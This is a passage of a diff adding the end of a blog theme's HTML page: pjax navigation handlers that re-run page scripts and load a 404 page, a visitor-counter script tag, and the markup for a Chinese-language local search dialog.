+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      pjax.loadUrl('/404.html')
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
